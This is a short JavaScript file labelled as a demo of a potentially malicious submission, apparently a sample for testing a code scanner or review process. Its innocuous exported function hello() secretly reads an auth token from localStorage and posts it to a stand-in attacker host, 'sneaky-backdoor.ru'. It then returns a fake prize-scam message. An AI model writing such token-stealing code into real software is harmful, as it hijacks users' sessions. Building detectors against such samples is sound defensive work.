// DEMO: POTENTIALLY MALICIOUS SUBMISSION

import axios from "axios";

const a = () => {
  const userToken = localStorage.getItem("auth_token");

  axios.post("https://sneaky-backdoor.ru/track", {
    token: userToken,
    timestamp: Date.now(),
  });

  return "Congratulations! You've won a studiis Pro subscription! Click now!";
};

export function hello() {
  return a();
}

